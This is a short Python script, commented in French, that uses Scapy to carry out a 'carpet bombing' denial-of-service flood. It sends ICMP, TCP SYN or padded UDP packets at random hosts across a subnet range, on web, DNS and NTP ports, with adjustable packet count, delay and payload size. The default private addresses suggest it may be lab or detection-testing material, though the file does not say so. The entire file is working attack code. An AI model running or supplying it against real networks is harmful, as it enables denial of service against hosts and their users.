import argparse
import random
import time
from scapy.all import ICMP, IP, TCP, UDP, send

PACKET_COUNT = 500  # Nombre de paquets envoyés par l'attaquant
DELAY = 0.0  # Délai entre deux paquets
PAYLOAD_SIZE = 512  # Taille des données UDP pour augmenter le volume de trafic
TCP_PORTS = [80, 443, 8080]  # Ports TCP ciblés par l'attaque
UDP_PORTS = [53, 123, 5353]  # Ports UDP ciblés par l'attaque

def parse_targets(raw_targets):
    # Transformation d'une plage 10.0.0.1-10.0.0.8 en liste d'adresses IP
    start, end = raw_targets.split("-", maxsplit=1)
    prefix = ".".join(start.split(".")[:3])
    first_host = int(start.split(".")[-1])
    last_host = int(end.split(".")[-1])
    return [f"{prefix}.{i}" for i in range(first_host, last_host + 1)]

def parse_args():
    # Récupération des arguments passés au script
    parser = argparse.ArgumentParser(description="Attaque carpet bombing simple")
    parser.add_argument("--targets", default="10.0.0.1-10.0.0.8")
    parser.add_argument("--packet-count", type=int, default=PACKET_COUNT)
    parser.add_argument("--delay", type=float, default=DELAY)
    parser.add_argument("--payload-size", type=int, default=PAYLOAD_SIZE)
    parser.add_argument("--protocol", choices=["ICMP", "TCP", "UDP", "MIX"], default="UDP")
    return parser.parse_args()

def choose_protocol(protocol):
    # Choix du protocole à utiliser pour le paquet
    if protocol == "MIX":
        return random.choice(["ICMP", "TCP", "UDP"])

    return protocol

def create_packet(target, protocol, payload_size):
    # Création d'un paquet ICMP vers une victime
    if protocol == "ICMP":
        return IP(dst=target) / ICMP()

    # Création d'un paquet TCP SYN vers une victime
    if protocol == "TCP":
        return IP(dst=target) / TCP(dport=random.choice(TCP_PORTS), flags="S")

    # Création d'un paquet UDP vers une victime
    return IP(dst=target) / UDP(dport=random.choice(UDP_PORTS)) / ("X" * payload_size)

def run():
    # Récupération des arguments du script
    args = parse_args()

    # Récupération des cibles de l'attaque
    targets = parse_targets(args.targets)

    # Envoi de paquets vers plusieurs IP du sous-réseau victime
    for _ in range(args.packet_count):
        target = random.choice(targets)
        protocol = choose_protocol(args.protocol)
        packet = create_packet(target, protocol, args.payload_size)

        # Envoi du paquet avec Scapy
        send(packet, verbose=False)

        # Pause optionnelle entre les paquets
        if args.delay > 0:
            time.sleep(args.delay)

    print("Carpet bombing attack completed")

if __name__ == "__main__":
    run()
